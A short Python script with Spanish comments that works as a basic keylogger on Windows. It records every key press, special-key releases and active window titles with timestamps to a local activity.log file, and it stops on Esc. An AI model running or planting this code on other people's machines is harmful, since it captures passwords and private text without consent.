import win32gui  # type: ignore
from datetime import datetime
from pynput.keyboard import Key, Listener

last_window = None


def get_active_window():
    # obtiene el identificador de la ventana
    window_handle = win32gui.GetForegroundWindow()

    # obtiene el nombre de la ventana
    window_title = win32gui.GetWindowText(window_handle)

    return window_title


def save_log(timestamp, key_event, key_text):
    # almacena los eventos registrados
    with open("activity.log", "a") as log_file:
        log_file.write(f"{timestamp} | {key_event} | {key_text}\n")


def format_key(key):
    try:
        # si obtienen caracteres
        return key.char
    except AttributeError:
        # las teclas especiales no tienen atributo char, pero sí nombre
        return f"[{key.name}]"


def on_press(key):
    # se ejecuta cuando se presiona una tecla
    global last_window

    current_window = get_active_window()

    # Registra la ventana activa cuando cambia
    if current_window != last_window:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        save_log(timestamp, "WINDOW_CHANGE", current_window)
        last_window = current_window

    # registra la tecla presionada con su timestamp
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    key_text = format_key(key)
    key_event = "PRESSED"

    save_log(timestamp, key_event, key_text)


def on_release(key):
    # Registra cuando se sueltan las teclas especiales
    if isinstance(key, Key):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        key_text = format_key(key)
        key_event = "RELEASE"

        save_log(timestamp, key_event, key_text)

    # Detiene el programa cuando la tecla presionada (y soltada) es esc
    if key == Key.esc:
        return False


# inicia el listener y conecta cada evento con su función de callback
with Listener(on_press=on_press, on_release=on_release) as listener:
    # mantiene en ejecución el listener hasta que on_release regresa False
    listener.join()
